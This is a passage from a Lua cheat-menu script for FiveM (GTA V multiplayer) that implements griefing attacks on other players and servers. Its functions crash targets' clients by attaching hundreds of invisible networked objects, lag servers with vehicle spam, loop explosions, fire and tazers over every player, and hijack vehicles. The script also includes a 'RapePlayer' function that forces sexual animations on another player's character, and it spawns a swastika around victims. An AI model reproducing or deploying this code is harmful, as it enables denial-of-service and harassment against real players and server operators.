               return ADRVSDD:GetFunction("GetPlayerServerId")(src) ~= nil and ADRVSDD:GetFunction("GetPlayerServerId")(src) > 0
           end
       
           function ADRVSDD:SpawnLocalVehicle(modelName, replaceCurrent, spawnInside)
               CreateThread(function()
                   local speed = 0
                   local rpm = 0
       
                   if ADRVSDD:GetFunction("IsModelValid")(modelName) and ADRVSDD:GetFunction("IsModelAVehicle")(modelName) then
                       ADRVSDD:GetFunction("RequestModel")(modelName)
       
                       while not ADRVSDD:GetFunction("HasModelLoaded")(modelName) do
                           Wait(0)
                       end
       
                       local pos = (spawnInside and ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(ADRVSDD:GetFunction("PlayerPedId")(), 0.0, 0.0, 0.0) or ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(ADRVSDD:GetFunction("PlayerPedId")(), 0.0, 4.0, 0.0))
                       local heading = ADRVSDD:GetFunction("GetEntityHeading")(ADRVSDD:GetFunction("PlayerPedId")()) + (spawnInside and 0 or 90)
                       local vehicle = ADRVSDD:GetFunction("CreateVehicle")(ADRVSDD:GetFunction("GetHashKey")(modelName), pos.x, pos.y, pos.z, heading, true, false)
                       ADRVSDD:GetFunction("SetPedIntoVehicle")(ADRVSDD:GetFunction("PlayerPedId")(), vehicle, -1)
                       ADRVSDD:GetFunction("SetVehicleEngineOn")(vehicle, true, true)
                       ADRVSDD:GetFunction("SetVehicleForwardSpeed")(vehicle, speed)
                       ADRVSDD:GetFunction("SetVehicleCurrentRpm")(vehicle, rpm)
                   end
               end)
           end
       
           local _text_input
       
           function ADRVSDD:DrawTextInput()
               if not _text_input or _text_input == "" then return end
               ADRVSDD.Painter:DrawText(_text_input, 4, false, self:ScrW() / 3.25, self:ScrH() / 2.7, 0.4, ADRVSDD.Tertiary[1], ADRVSDD.Tertiary[2], ADRVSDD.Tertiary[3], 255)
           end
       
           function ADRVSDD:GetTextInput(TextEntry, ExampleText, MaxStringLength)
               _text_input = TextEntry .. " (DO NOT PRESS ESCAPE / RMB)"
               ADRVSDD:GetFunction("DisplayOnscreenKeyboard")(1, "", "", ExampleText, "", "", "", MaxStringLength)
               blockinput = true
       
               while ADRVSDD:GetFunction("UpdateOnscreenKeyboard")() ~= 1 and ADRVSDD:GetFunction("UpdateOnscreenKeyboard")() ~= 2 do
                   if ADRVSDD.Showing then
                       ADRVSDD:DrawMenu()
                   end
       
                   self:DrawTextInput()
                   Wait(0)
               end
       
               if ADRVSDD:GetFunction("UpdateOnscreenKeyboard")() ~= 2 then
                   if ADRVSDD.Showing then
                       ADRVSDD:DrawMenu()
                   end
       
                   _text_input = nil
                   local result = ADRVSDD:GetFunction("GetOnscreenKeyboardResult")()
                   blockinput = false
                   ADRVSDD:GetFunction("CancelOnscreenKeyboard")()
       
                   return result
               else
                   if ADRVSDD.Showing then
                       ADRVSDD:DrawMenu()
                   end
       
                   _text_input = nil
                   blockinput = false
                   ADRVSDD:GetFunction("CancelOnscreenKeyboard")()
       
                   return nil
               end
           end
       
           function ADRVSDD.Util:DeleteEntity(entity)
               if not ADRVSDD:GetFunction("DoesEntityExist")(entity) then return end
               ADRVSDD:GetFunction("NetworkRequestControlOfEntity")(entity)
               ADRVSDD:GetFunction("SetEntityAsMissionEntity")(entity, true, true)
               ADRVSDD:GetFunction("DeletePed")(entity)
               ADRVSDD:GetFunction("DeleteEntity")(entity)
               ADRVSDD:GetFunction("DeleteObject")(entity)
               ADRVSDD:GetFunction("DeleteVehicle")(entity)
           end
       
           local sounds = {
               ["INFO"] = {
                   times = 3,
                   name = "DELETE",
                   dict = "HUD_DEATHMATCH_SOUNDSET"
               },
               ["WARN"] = {
                   times = 1,
                   name = "Turn",
                   dict = "DLC_HEIST_HACKING_SNAKE_SOUNDS"
               },
               ["ERROR"] = {
                   times = 3,
                   name = "Hack_Failed",
                   dict = "DLC_HEIST_BIOLAB_PREP_HACKING_SOUNDS"
               }
           }
       
           local last_sound = 0
       
           function ADRVSDD:AddNotification(type, msg, timeout)
               timeout = timeout or 10000
       
               if ADRVSDD.Config.UseSounds and last_sound <= ADRVSDD:GetFunction("GetGameTimer")() then
                   local sound = sounds[type] or {}
       
                   for i = 1, sound.times or 1 do
                       if sound.name and sound.dict then
                           ADRVSDD:GetFunction("PlaySoundFrontend")(-1, sound.name, sound.dict, false)
                       end
                   end
       
                   last_sound = ADRVSDD:GetFunction("GetGameTimer")() + 200
               end
       
               for _, v in dict.ipairs(self.Notifications) do
                   if (v.RawMsg or v.Message) == msg and not self.Notifications[_ + 1] then
                       v.Count = (v.Count or 1) + 1
                       v.RawMsg = v.RawMsg or v.Message
                       v.Message = v.RawMsg .. " ~w~(x" .. v.Count .. ")"
                       v.Duration = (timeout / 1000)
                       v.Expires = ADRVSDD:GetFunction("GetGameTimer")() + timeout
       
                       return
                   end
               end
       
               local notification = {}
               notification.Type = type
               notification.Message = msg
               notification.Duration = timeout / 1000
               notification.Expires = ADRVSDD:GetFunction("GetGameTimer")() + timeout
       
               self.Notifications[#self.Notifications + 1] = notification
               ADRVSDD:Print("[Notification] [" .. type .. "]" .. ": " .. msg)
           end
       
           function ADRVSDD:DoNetwork(obj)
               if not ADRVSDD:GetFunction("DoesEntityExist")(obj) then return end
               local id = ADRVSDD:GetFunction("ObjToNet")(obj)
               ADRVSDD:GetFunction("NetworkSetNetworkIdDynamic")(id, true)
               ADRVSDD:GetFunction("SetNetworkIdExistsOnAllMachines")(id, true)
               ADRVSDD:GetFunction("SetNetworkIdCanMigrate")(id, false)
       
               for _, src in dict.pairs(ADRVSDD.PlayerCache) do
                   ADRVSDD:GetFunction("SetNetworkIdSyncToPlayer")(id, src, true)
               end
           end
       
           function ADRVSDD:GasPlayer(player)
               if ADRVSDD.Config.SafeMode then return ADRVSDD:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.") end
       
               CreateThread(function()
                   local ped = ADRVSDD:GetFunction("GetPlayerPed")(player)
                   if not ADRVSDD:GetFunction("DoesEntityExist")(ped) then return end
                   ADRVSDD:GetFunction("ClearPedTasksImmediately")(ped)
                   local dest = ADRVSDD:GetFunction("GetPedBoneCoords")(ped, ADRVSDD:GetFunction("GetPedBoneIndex")(ped, 0), 0.0, 0.0, 0.0, 0.0)
                   local origin = ADRVSDD:GetFunction("GetPedBoneCoords")(ped, ADRVSDD:GetFunction("GetPedBoneIndex")(ped, 57005), 0.0, 0.0, 0.0, 0.0)
       
                   for i = 1, 5 do
                       ADRVSDD:GetFunction("AddExplosion")(origin.x + dict.math.random(-1, 1), origin.y + dict.math.random(-1, 1), origin.z - 1.0, 12, 100.0, true, false, 0.0)
                       Wait(10)
                   end
       
                   local pos = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, 0.0, 0.0, 0.0)
                   local fence_u = ADRVSDD:GetFunction("CreateObject")(-759902142, pos.x - 1.5, pos.y - 1.0, pos.z - 1.0, true, true, true)
                   ADRVSDD:DoNetwork(fence_u)
                   ADRVSDD:GetFunction("SetEntityRotation")(fence_u, 0.0, 0.0, 0.0)
                   ADRVSDD:GetFunction("FreezeEntityPosition")(fence_u, true)
                   Wait(10)
                   local fence_r = ADRVSDD:GetFunction("CreateObject")(-759902142, pos.x - 1.5, pos.y - 1.0, pos.z - 1.0, true, true, true)
                   ADRVSDD:DoNetwork(fence_r)
                   ADRVSDD:GetFunction("SetEntityRotation")(fence_r, 0.0, 0.0, 90.0)
                   ADRVSDD:GetFunction("FreezeEntityPosition")(fence_r, true)
                   Wait(10)
                   local fence_b = ADRVSDD:GetFunction("CreateObject")(-759902142, pos.x - 1.5, pos.y + 1.85, pos.z - 1.0, true, true, true)
                   ADRVSDD:DoNetwork(fence_b)
                   ADRVSDD:GetFunction("SetEntityRotation")(fence_b, 0.0, 0.0, 0.0)
                   ADRVSDD:GetFunction("FreezeEntityPosition")(fence_b, true)
                   local fence_l = ADRVSDD:GetFunction("CreateObject")(-759902142, pos.x + 1.35, pos.y - 1.0, pos.z - 1.0, true, true, true)
                   ADRVSDD:DoNetwork(fence_l)
                   ADRVSDD:GetFunction("SetEntityRotation")(fence_l, 0.0, 0.0, 90.0)
                   ADRVSDD:GetFunction("FreezeEntityPosition")(fence_l, true)
                   ADRVSDD.FreeCam.SpawnerOptions["PREMADE"]["SWASTIKA"](ped, 10.0)
               end)
           end
       
           function ADRVSDD:TazePlayer(player)
               local ped = ADRVSDD:GetFunction("GetPlayerPed")(player)
               local destination = ADRVSDD:GetFunction("GetPedBoneCoords")(ped, 0, 0.0, 0.0, 0.0)
               local origin = ADRVSDD:GetFunction("GetPedBoneCoords")(ped, 57005, 0.0, 0.0, 0.2)
               ADRVSDD:GetFunction("ShootSingleBulletBetweenCoords")(origin.x, origin.y, origin.z, destination.x, destination.y, destination.z, 1, true, ADRVSDD:GetFunction("GetHashKey")("WEAPON_STUNGUN"), ADRVSDD:GetFunction("PlayerPedId")(), true, false, 24000.0)
           end
       
           function ADRVSDD:HydrantPlayer(player)
               local ped = ADRVSDD:GetFunction("GetPlayerPed")(player)
               local origin = ADRVSDD:GetFunction("GetPedBoneCoords")(ped, 0, 0.0, 0.0, 0.2)
               ADRVSDD:GetFunction("AddExplosion")(origin.x, origin.y, origin.z - 1.0, 13, 100.0, (ADRVSDD:GetFunction("IsDisabledControlPressed")(0, ADRVSDD.Keys["LEFTSHIFT"]) and false or true), false, 0.0)
           end
       
           function ADRVSDD:FirePlayer(player)
               local ped = ADRVSDD:GetFunction("GetPlayerPed")(player)
               local origin = ADRVSDD:GetFunction("GetPedBoneCoords")(ped, 0, 0.0, 0.0, 0.2)
               ADRVSDD:GetFunction("AddExplosion")(origin.x, origin.y, origin.z - 1.0, 12, 100.0, (ADRVSDD:GetFunction("IsDisabledControlPressed")(0, ADRVSDD.Keys["LEFTSHIFT"]) and false or true), false, 0.0)
           end
       
           local crash_model_list = {}
           local crash_models = {"hei_prop_carrier_cargo_02a", "p_cablecar_s", "p_ferris_car_01", "prop_cj_big_boat", "prop_rock_4_big2", "prop_steps_big_01", "v_ilev_lest_bigscreen", "prop_carcreeper", "apa_mp_h_bed_double_09", "apa_mp_h_bed_wide_05", "sanchez", "cargobob", "prop_cattlecrush", "prop_cs_documents_01"} --{"prop_ferris_car_01_lod1", "prop_construcionlamp_01", "prop_fncconstruc_01d", "prop_fncconstruc_02a", "p_dock_crane_cabl_s", "prop_dock_crane_01", "prop_dock_crane_02_cab", "prop_dock_float_1", "prop_dock_crane_lift", "apa_mp_h_bed_wide_05", "apa_mp_h_bed_double_08", "apa_mp_h_bed_double_09", "csx_seabed_bldr4_", "imp_prop_impexp_sofabed_01a", "apa_mp_h_yacht_bed_01"}
       
           CreateThread(function()
               ADRVSDD:RequestModelSync(spike_model)
       
               local loaded = 0
       
               for i = 1, #crash_models do
                   if ADRVSDD:RequestModelSync(crash_models[i]) then
                       loaded = loaded + 1
                   end
               end
       
               for i = 1, #crash_models * 5 do
                   for _ = 1, 2 do
                       table.insert(crash_models, crash_models[dict.math.random(1, #crash_models)])
                       loaded = loaded + 1
                   end
               end
       
               ADRVSDD:Print("[MISC] Loaded " .. loaded .. " model(s).")
           end)
       
           local crash_loop
           local notified_crash = {}
       
           function ADRVSDD:CrashPlayer(player, all, strict)
               if ADRVSDD.Config.SafeMode then return ADRVSDD:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.") end
               local ATT_LIMIT = 400
               local CUR_ATT_COUNT = 0
       
               CreateThread(function()
                   local ped = ADRVSDD:GetFunction("GetPlayerPed")(player)
                   local playerPos = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, 0.0, 0.0, 0.0)
                   local selfPos = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(ADRVSDD:GetFunction("PlayerPedId")(), 0.0, 0.0, 0.0)
                   local dist = ADRVSDD:GetFunction("GetDistanceBetweenCoords")(playerPos.x, playerPos.y, playerPos.z, selfPos.x, selfPos.y, selfPos.z, true)
       
                   if dist <= 500.0 then
                       local safeX, safeY, safeZ = playerPos.x - dict.math.random(-1000, 1000), playerPos.y - dict.math.random(-1000, 1000), -200
                       ADRVSDD:GetFunction("SetEntityCoords")(ADRVSDD:GetFunction("PlayerPedId")(), _clamp(safeX, -2000, 2000) + 0.0, _clamp(safeY, -2000, 2000) + 0.0, safeZ)
                   end
       
                   ADRVSDD:AddNotification("INFO", "Crashing " .. ADRVSDD:CleanName(ADRVSDD:GetFunction("GetPlayerName")(player)), 10000)
                   local bad_obj
       
                   for i = 1, ATT_LIMIT do
                       if CUR_ATT_COUNT >= ATT_LIMIT or not ADRVSDD:GetFunction("DoesEntityExist")(ped) then break end
                       local method = dict.math.random(1, 2)
       
                       if strict == "object" then
                           method = 1
                       elseif strict == "ped" then
                           method = 2
                       end
       
                       if method == 1 then
                           local model = crash_models[dict.math.random(1, #crash_models)]
                           local obj = ADRVSDD:GetFunction("CreateObject")(ADRVSDD:GetFunction("GetHashKey")(model), playerPos.x, playerPos.y, playerPos.z, true, true, true)
       
                           if not ADRVSDD:GetFunction("DoesEntityExist")(obj) then
                               bad_obj = true
       
                               if not notified_crash[model] then
                                   ADRVSDD:Print("[CRASH] Failed to load object ^3" .. model .. "^7")
                                   notified_crash[model] = true
                               end
                           else
                               ADRVSDD:DoNetwork(obj)
                               ADRVSDD:GetFunction("AttachEntityToEntity")(obj, ped, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, true, true, true, 1, false)
                               ADRVSDD:GetFunction("SetEntityVisible")(obj, false)
                               crash_model_list[obj] = true
                               CUR_ATT_COUNT = CUR_ATT_COUNT + 1
                           end
                       elseif method == 2 then
                           local model = ADRVSDD.FreeCam.SpawnerOptions.PED[dict.math.random(1, #ADRVSDD.FreeCam.SpawnerOptions.PED)]
                           local ent = ADRVSDD:GetFunction("CreatePed")(24, ADRVSDD:GetFunction("GetHashKey")(model), playerPos.x, playerPos.y, playerPos.z, 0.0, true, true)
       
                           if ADRVSDD:GetFunction("DoesEntityExist")(ent) then
                               ADRVSDD:DoNetwork(ent)
                               ADRVSDD:GetFunction("AttachEntityToEntity")(ent, ped, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, true, true, 1, false)
                               ADRVSDD:GetFunction("SetEntityVisible")(ent, false)
                               crash_model_list[ent] = true
                               CUR_ATT_COUNT = CUR_ATT_COUNT + 1
                           end
                       end
       
                       Wait(0)
                   end
       
                   if bad_obj then
                       self:AddNotification("ERROR", "Some crash models failed to load. See console for details.", 10000)
                   end
       
                   notified_crash = {}
                   ADRVSDD:CleanupCrash(player, all)
               end)
           end
       
           function ADRVSDD:CleanupCrash(player, all)
               CreateThread(function()
                   if crash_loop ~= nil and not all then return end
                   crash_loop = not all and player or nil
       
                   if crash_loop and not ADRVSDD:GetFunction("DoesEntityExist")(crash_loop) then
                       crash_loop = nil
                   end
       
                   local timeout = 0
       
                   while (all and timeout <= 180000) or (ADRVSDD:GetFunction("DoesEntityExist")(ADRVSDD:GetFunction("GetPlayerPed")(crash_loop)) and timeout <= 120000) do
                       timeout = timeout + 100
                       Wait(100)
                   end
       
                   while true do
                       if not ADRVSDD.Enabled then return end
       
                       for cobj, _ in dict.pairs(crash_model_list) do
                           if ADRVSDD:RequestControlSync(cobj) then
                               ADRVSDD:GetFunction("DeleteObject")(cobj)
                               ADRVSDD:GetFunction("DeleteEntity")(cobj)
                               crash_model_list[cobj] = nil
                           end
                       end
       
                       if #crash_model_list == 0 then
                           ADRVSDD:AddNotification("INFO", "Cleaned up crash objects.")
                           crash_loop = nil
       
                           return
                       else
                           ADRVSDD:AddNotification("ERROR", "Failed to cleanup " .. #crash_model_list .. " crash object" .. (#crash_model_list ~= 1 and "s" or "") .. ". Retrying in 5 seconds.")
                           Wait(5000)
                       end
                   end
               end)
           end
       
           function ADRVSDD:RapePlayer(player)
               if ADRVSDD.Config.SafeMode then return ADRVSDD:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.") end
       
               CreateThread(function()
                   local model = ADRVSDD.FreeCam.SpawnerOptions.PED[dict.math.random(1, #ADRVSDD.FreeCam.SpawnerOptions.PED)]
                   ADRVSDD:RequestModelSync(model)
                   ADRVSDD:GetFunction("RequestAnimDict")("rcmpaparazzo_2")
       
                   while not ADRVSDD:GetFunction("HasAnimDictLoaded")("rcmpaparazzo_2") do
                       Wait(0)
                   end
       
                   if ADRVSDD:GetFunction("IsPedInAnyVehicle")(ADRVSDD:GetFunction("GetPlayerPed")(player), true) then
                       local veh = ADRVSDD:GetFunction("GetVehiclePedIsIn")(ADRVSDD:GetFunction("GetPlayerPed")(player), true)
                       ADRVSDD:GetFunction("ClearPedTasksImmediately")(ADRVSDD:GetFunction("GetPlayerPed")(player))
                       while not ADRVSDD:GetFunction("NetworkHasControlOfEntity")(veh) do
                           ADRVSDD:GetFunction("NetworkRequestControlOfEntity")(veh)
                           Wait(0)
                       end
       
                       ADRVSDD:GetFunction("SetEntityAsMissionEntity")(veh, true, true)
                       ADRVSDD:GetFunction("DeleteVehicle")(veh)
                       ADRVSDD:GetFunction("DeleteEntity")(veh)
                   end
       
                   local count = -0.2
       
                   for _ = 1, 3 do
                       local c = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(ADRVSDD:GetFunction("GetPlayerPed")(player), 0.0, 0.0, 0.0)
                       local x, y, z = c.x, c.y, c.z
                       local rape_ped = ADRVSDD:GetFunction("CreatePed")(4, ADRVSDD:GetFunction("GetHashKey")(model), x, y, z, 0.0, true, false)
                       ADRVSDD:GetFunction("SetEntityAsMissionEntity")(rape_ped, true, true)
                       ADRVSDD:GetFunction("AttachEntityToEntity")(rape_ped, ADRVSDD:GetFunction("GetPlayerPed")(player), 4103, 11816, count, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                       ADRVSDD:GetFunction("ClearPedTasks")(ADRVSDD:GetFunction("GetPlayerPed")(player))
                       ADRVSDD:GetFunction("TaskPlayAnim")(ADRVSDD:GetFunction("GetPlayerPed")(player), "rcmpaparazzo_2", "shag_loop_poppy", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                       ADRVSDD:GetFunction("SetPedKeepTask")(rape_ped)
                       ADRVSDD:GetFunction("SetPedAlertness")(rape_ped, 0.0)
                       ADRVSDD:GetFunction("TaskPlayAnim")(rape_ped, "rcmpaparazzo_2", "shag_loop_a", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                       ADRVSDD:GetFunction("SetEntityInvincible")(rape_ped, true)
                       count = count - 0.4
                   end
               end)
           end
       
           local car_spam = {"adder", "dinghy", "biff", "rhapsody", "ruiner", "picador", "sabregt", "baller4", "emperor"}
       
           function ADRVSDD:CarSpamServer()
               if ADRVSDD.Config.SafeMode then return ADRVSDD:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.") end
       
               CreateThread(function()
                   for _, hash in dict.ipairs(car_spam) do
                       self:RequestModelSync(hash)
       
                       for _, src in dict.pairs(ADRVSDD.PlayerCache) do
                           src = dict.tonumber(src)
       
                           if src ~= PlayerId() or ADRVSDD.Config.OnlineIncludeSelf then
                               local ped = ADRVSDD:GetFunction("GetPlayerPed")(src)
                               local coords = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, 0.0, 0.0, 0.0)
                               ADRVSDD:GetFunction("CreateVehicle")(ADRVSDD:GetFunction("GetHashKey")(hash), coords.x, coords.y, coords.z, ADRVSDD:GetFunction("GetEntityHeading")(ped), true, false)
                           end
       
                           Wait(5)
                       end
       
                       Wait(5)
                   end
               end)
           end
       
           local _use_lag_server
           local _use_hydrant_loop
           local _use_fire_loop
           local _use_taze_loop
           local _use_delete_loop
           local _use_explode_vehicle_loop
           local _use_explode_player_loop
           local _use_launch_loop
       
           function ADRVSDD:LaggingServer()
               if ADRVSDD.Config.SafeMode then return ADRVSDD:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.") end
       
               CreateThread(function()
                   while _use_lag_server do
                       for _, hash in dict.ipairs(car_spam) do
                           self:RequestModelSync(hash)
       
                           for _, src in dict.pairs(ADRVSDD.PlayerCache) do
                               src = dict.tonumber(src)
       
                               if src ~= PlayerId() or ADRVSDD.Config.OnlineIncludeSelf then
                                   local ped = ADRVSDD:GetFunction("GetPlayerPed")(src)
                                   local coords = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, 0.0, 0.0, 0.0)
                                   ADRVSDD:GetFunction("CreateVehicle")(ADRVSDD:GetFunction("GetHashKey")(hash), coords.x, coords.y, coords.z, ADRVSDD:GetFunction("GetEntityHeading")(ped), true, false)
                               end
       
                               Wait(5)
                           end
       
                           Wait(5)
                       end
       
                       Wait(20)
                   end
               end)
           end
       
           function ADRVSDD:HydrantLoop()
               if ADRVSDD.Config.SafeMode then return ADRVSDD:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.") end
       
               CreateThread(function()
                   while _use_hydrant_loop do
                       for _, src in dict.pairs(ADRVSDD.PlayerCache) do
                           if not _use_hydrant_loop then break end
                           src = dict.tonumber(src)
       
                           if src ~= PlayerId() or ADRVSDD.Config.OnlineIncludeSelf then
                               ADRVSDD:HydrantPlayer(src)
                           end
       
                           Wait(1)
                       end
       
                       Wait(5)
                   end
               end)
           end
       
           function ADRVSDD:FireLoop()
               if ADRVSDD.Config.SafeMode then return ADRVSDD:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.") end
       
               CreateThread(function()
                   while _use_fire_loop do
                       for _, src in dict.pairs(ADRVSDD.PlayerCache) do
                           if not _use_fire_loop then break end
                           src = dict.tonumber(src)
       
                           if src ~= PlayerId() or ADRVSDD.Config.OnlineIncludeSelf then
                               ADRVSDD:FirePlayer(src)
                           end
       
                           Wait(1)
                       end
       
                       Wait(5)
                   end
               end)
           end
       
           function ADRVSDD:TazeLoop()
               if ADRVSDD.Config.SafeMode then return ADRVSDD:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.") end
       
               CreateThread(function()
                   while _use_taze_loop do
                       for _, src in dict.pairs(ADRVSDD.PlayerCache) do
                           if not _use_taze_loop then break end
                           src = dict.tonumber(src)
       
                           if src ~= PlayerId() or ADRVSDD.Config.OnlineIncludeSelf then
                               ADRVSDD:TazePlayer(src)
                           end
       
                           Wait(1)
                       end
       
                       Wait(5)
                   end
               end)
           end
       
           function ADRVSDD:DeleteLoop()
               if ADRVSDD.Config.SafeMode then return ADRVSDD:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.") end
       
               CreateThread(function()
                   while _use_delete_loop do
                       local _veh = ADRVSDD:GetFunction("IsPedInAnyVehicle") and ADRVSDD:GetFunction("GetVehiclePedIsIn")(ADRVSDD:GetFunction("PlayerPedId")())
       
                       for veh in ADRVSDD:EnumerateVehicles() do
                           if not _use_delete_loop then break end
       
                           if veh ~= _veh or ADRVSDD.Config.OnlineIncludeSelf then
                               ADRVSDD.Util:DeleteEntity(veh)
                           end
       
                           Wait(1)
                       end
       
                       Wait(5)
                   end
               end)
           end
       
           function ADRVSDD:ExplodeVehicleLoop()
               if ADRVSDD.Config.SafeMode then return ADRVSDD:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.") end
       
               CreateThread(function()
                   while _use_explode_vehicle_loop do
                       local _veh = ADRVSDD:GetFunction("IsPedInAnyVehicle") and ADRVSDD:GetFunction("GetVehiclePedIsIn")(ADRVSDD:GetFunction("PlayerPedId")())
       
                       for veh in ADRVSDD:EnumerateVehicles() do
                           if not _use_explode_vehicle_loop then break end
       
                           if veh ~= _veh or ADRVSDD.Config.OnlineIncludeSelf then
                               ADRVSDD:GetFunction("NetworkExplodeVehicle")(veh, true, false, false)
                           end
       
                           Wait(1)
                       end
       
                       Wait(5)
                   end
               end)
           end
       
           function ADRVSDD:ExplodePlayerLoop()
               if ADRVSDD.Config.SafeMode then return ADRVSDD:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.") end
       
               CreateThread(function()
                   while _use_explode_player_loop do
                       for _, src in dict.pairs(ADRVSDD.PlayerCache) do
                           if not _use_explode_player_loop then break end
                           src = dict.tonumber(src)
       
                           if src ~= PlayerId() or ADRVSDD.Config.OnlineIncludeSelf then
                               ADRVSDD:GetFunction("AddExplosion")(ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(ADRVSDD:GetFunction("GetPlayerPed")(src), 0.0, 0.0, 0.0), 7, 100000.0, true, false, 0.0)
                           end
       
                           Wait(1)
                       end
       
                       Wait(5)
                   end
               end)
           end
       
           function ADRVSDD:LaunchLoop()
               if ADRVSDD.Config.SafeMode then return ADRVSDD:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.") end
       
               CreateThread(function()
                   while _use_launch_loop do
                       local _veh = ADRVSDD:GetFunction("IsPedInAnyVehicle") and ADRVSDD:GetFunction("GetVehiclePedIsIn")(ADRVSDD:GetFunction("PlayerPedId")())
       
                       for veh in ADRVSDD:EnumerateVehicles() do
                           if not _use_launch_loop then break end
       
                           if veh ~= _veh or ADRVSDD.Config.OnlineIncludeSelf then
                               if ADRVSDD:RequestControlSync(veh) then
                                   ADRVSDD:GetFunction("ApplyForceToEntity")(veh, 3, 0.0, 0.0, 9999999.0, 0.0, 0.0, 0.0, true, true, true, true, false, true)
                               end
                           end
       
                           Wait(1)
                       end
       
                       Wait(5)
                   end
               end)
           end
       
           function ADRVSDD:SpawnPed(where, heading, model, weapon)
               if not ADRVSDD:RequestModelSync(model) then return self:AddNotification("ERROR", "Couldn't load model ~r~" .. model .. " ~w~in time.", 2500) end
               local ped = ADRVSDD:GetFunction("CreatePed")(4, ADRVSDD:GetFunction("GetHashKey")(model), where.x, where.y, where.z, heading or 0.0, true, true)
               ADRVSDD:GetFunction("SetNetworkIdCanMigrate")(ADRVSDD:GetFunction("NetworkGetNetworkIdFromEntity")(ped), true)
               ADRVSDD:GetFunction("NetworkSetNetworkIdDynamic")(ADRVSDD:GetFunction("NetworkGetNetworkIdFromEntity")(ped), false)
       
               if weapon then
                   ADRVSDD:GetFunction("GiveWeaponToPed")(ped, ADRVSDD:GetFunction("GetHashKey")(weapon), 9000, false, true)
               end
       
               ADRVSDD:GetFunction("SetPedAccuracy")(ped, 100)
       
               return ped
           end
       
           function ADRVSDD:UnlockVehicle(veh)
               if not ADRVSDD:GetFunction("DoesEntityExist")(veh) or not ADRVSDD:GetFunction("IsEntityAVehicle")(veh) then return end
               if not ADRVSDD:RequestControlSync(veh) then return ADRVSDD:AddNotification("ERROR", "Failed to get network control in time. Please try again.", 5000) end
               ADRVSDD:GetFunction("SetVehicleDoorsLockedForAllPlayers")(veh, false)
               ADRVSDD:GetFunction("SetVehicleDoorsLockedForPlayer")(veh, PlayerId(), false)
               ADRVSDD:GetFunction("SetVehicleDoorsLocked")(veh, false)
               ADRVSDD:AddNotification("SUCCESS", "Vehicle unlocked.", 5000)
           end
       
           function ADRVSDD:DisableVehicle(veh)
               if not ADRVSDD:GetFunction("DoesEntityExist")(veh) or not ADRVSDD:GetFunction("IsEntityAVehicle")(veh) then return end
               if not ADRVSDD:RequestControlSync(veh) then return ADRVSDD:AddNotification("ERROR", "Failed to get network control in time. Please try again.", 5000) end
               SetVehicleUndriveable(veh, true)
               SetVehicleWheelWidth(veh, 100.0)
       
               for i = 0, GetVehicleNumberOfWheels(veh) do
                   SetVehicleWheelTireColliderSize(veh, i, 100.0)
                   SetVehicleWheelSize(veh, i, 100.0)
                   SetVehicleWheelTireColliderWidth(veh, i, 100.0)
               end
       
               SetVehicleLights(veh, 2)
               SetVehicleLightsMode(veh, 2)
               SetVehicleEngineTemperature(veh, dict.math.huge + 0.0)
               SetVehicleEngineOn(veh, true, true, true)
               SetVehicleEngineCanDegrade(veh, true)
               ModifyVehicleTopSpeed(veh, 1.0)
               ADRVSDD:AddNotification("SUCCESS", "Vehicle disabled.", 5000)
           end
       
           function ADRVSDD:StealVehicleThread(who, veh, nodrive)
               if not ADRVSDD:GetFunction("DoesEntityExist")(veh) or not ADRVSDD:GetFunction("IsEntityAVehicle")(veh) then return end
               ADRVSDD:GetFunction("TaskSetBlockingOfNonTemporaryEvents")(who, true)
               ADRVSDD:GetFunction("ClearPedTasks")(who)
               local driver = ADRVSDD:GetFunction("GetPedInVehicleSeat")(veh, -1)
               local timeout = 0
       
               if ADRVSDD:GetFunction("DoesEntityExist")(driver) then
                   while ADRVSDD:GetFunction("DoesEntityExist")(veh) and ADRVSDD:GetFunction("GetPedInVehicleSeat")(veh, -1) == driver and timeout <= 25000 do
                       ADRVSDD:GetFunction("TaskCombatPed")(who, driver, 0, 16)
                       timeout = timeout + 100
                       ADRVSDD:GetFunction("SetVehicleDoorsLockedForAllPlayers")(veh, false)
                       ADRVSDD:GetFunction("SetVehicleDoorsLocked")(veh, 7)
       
                       if ADRVSDD:GetFunction("IsDisabledControlPressed")(0, ADRVSDD.Keys["R"]) then
                           self.Util:DeleteEntity(who)
                           ADRVSDD:AddNotification("INFO", "Hijack cancelled.")
       
                           return false
                       end
       
                       Wait(100)
                   end
       
                   ADRVSDD:GetFunction("ClearPedTasks")(who)
                   ADRVSDD:GetFunction("TaskEnterVehicle")(who, veh, 10000, -1, 2.0, 1, 0)
       
                   while ADRVSDD:GetFunction("DoesEntityExist")(veh) and ADRVSDD:GetFunction("GetPedInVehicleSeat")(veh, -1) ~= who and timeout <= 25000 do
                       timeout = timeout + 100
                       ADRVSDD:GetFunction("SetVehicleDoorsLockedForAllPlayers")(veh, false)
                       ADRVSDD:GetFunction("SetVehicleDoorsLocked")(veh, 7)
                       ADRVSDD:GetFunction("NetworkRequestControlOfEntity")(veh)
       
